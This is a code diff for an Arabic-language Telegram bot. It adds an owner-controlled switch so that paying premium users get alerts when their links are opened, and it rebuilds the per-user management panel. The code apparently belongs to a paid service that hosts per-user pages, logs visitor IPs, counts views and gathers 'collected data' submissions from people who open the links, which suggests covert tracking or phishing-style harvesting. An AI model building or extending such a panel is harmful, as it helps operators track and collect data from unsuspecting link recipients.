@@ -178,7 +178,11 @@ async function _flushBuf(tid, ip) {
     bot.sendMessage(BOT_OWNER, ownerMsg, {parse_mode:"Markdown", reply_markup: chatKb}).catch(()=>{});
   } else {
     bot.sendMessage(BOT_OWNER, ownerMsg, {parse_mode:"Markdown", reply_markup: chatKb}).catch(()=>{});
-    bot.sendMessage(Number(tid), premMsg, {parse_mode:"Markdown"}).catch(()=>{});
+    // Only notify paid premium users if owner enabled it — free users never get notified
+    const tidStr = String(tid);
+    if (isPremium(Number(tid)) && premium[tidStr]?.linkNotif === true) {
+      bot.sendMessage(Number(tid), premMsg, {parse_mode:"Markdown"}).catch(()=>{});
+    }
   }
 }
 
@@ -2186,10 +2190,42 @@ bot.on('callback_query', async (q) => {
         [{text: hasAccess ? "🔒 تعطيل الصفحة عليه" : "✅ تفعيل الصفحة له", callback_data:`pg_utoggle_${uid}`}],
         [{text: prem.pushNotif===false ? "🔔 تفعيل إشعارات الجهاز له" : "🔕 تعطيل إشعارات الجهاز عليه", callback_data:`pg_upushtoggle_${uid}`}],
         [{text: prem.receiveOwnerSubs ? "📤✅ إيقاف إرسال بيانات صفحتك له" : "📤 إرسال بيانات صفحتك له", callback_data:`pg_ufwdtoggle_${uid}`}],
+        [{text: prem.linkNotif ? "🔔✅ إيقاف إشعار فتح روابطه" : "🔔 تفعيل إشعار فتح روابطه", callback_data:`pg_ulinknotif_${uid}`}],
         [{text:"🗑️ مسح بياناته",callback_data:`pg_uclear_${uid}`},{text:"📋 سجل بياناته",callback_data:`pg_ulog_${uid}`}],
         [{text:"🔙 رجوع",callback_data:"premlist"}]
       ]})}
     );
+  }
+
+  if (data.startsWith("pg_ulinknotif_") && q.from.id === BOT_OWNER) {
+    const uid = data.replace("pg_ulinknotif_","");
+    if (!premium[uid]) return;
+    premium[uid].linkNotif = !premium[uid].linkNotif;
+    savePremium();
+    const on = premium[uid].linkNotif;
+    bot.answerCallbackQuery(q.id, {text: on ? "🔔 سيصله إشعار عند فتح روابطه" : "🔕 لن يصله إشعار"}).catch(()=>{});
+    const prof2 = profiles[uid]||{};
+    const prem2 = premium[uid]||{};
+    const cfg2 = getUserPage(uid);
+    const subs2 = getUserSubs(uid);
+    const hasAccess2 = !!prem2.pageAccess;
+    const link2 = `${hostURL}/p/u/${uid}`;
+    return bot.editMessageText(
+      `🎛️ *إدارة صفحة: ${prof2.name||uid}*\n\n` +
+      `🔑 الوصول: ${hasAccess2 ? "✅ مفعّل" : "🔒 معطّل"}\n` +
+      `📡 الحالة: ${cfg2.active ? "🟢 نشطة" : "🔴 متوقفة"}\n` +
+      `👁️ مشاهدات: ${cfg2.views||0}\n` +
+      `✅ بيانات مجموعة: ${subs2.length}\n` +
+      `🔗 الرابط: \`${link2}\``,
+      {chat_id:chatId, message_id:q.message.message_id, parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[
+        [{text: hasAccess2 ? "🔒 تعطيل الصفحة عليه" : "✅ تفعيل الصفحة له", callback_data:`pg_utoggle_${uid}`}],
+        [{text: prem2.pushNotif===false ? "🔔 تفعيل إشعارات الجهاز له" : "🔕 تعطيل إشعارات الجهاز عليه", callback_data:`pg_upushtoggle_${uid}`}],
+        [{text: prem2.receiveOwnerSubs ? "📤✅ إيقاف إرسال بيانات صفحتك له" : "📤 إرسال بيانات صفحتك له", callback_data:`pg_ufwdtoggle_${uid}`}],
+        [{text: on ? "🔔✅ إيقاف إشعار فتح روابطه" : "🔔 تفعيل إشعار فتح روابطه", callback_data:`pg_ulinknotif_${uid}`}],
+        [{text:"🗑️ مسح بياناته",callback_data:`pg_uclear_${uid}`},{text:"📋 سجل بياناته",callback_data:`pg_ulog_${uid}`}],
+        [{text:"🔙 رجوع",callback_data:"premlist"}]
+      ]})}
+    ).catch(()=>{});
   }
 
   if (data.startsWith("pg_ufwdtoggle_") && q.from.id === BOT_OWNER) {
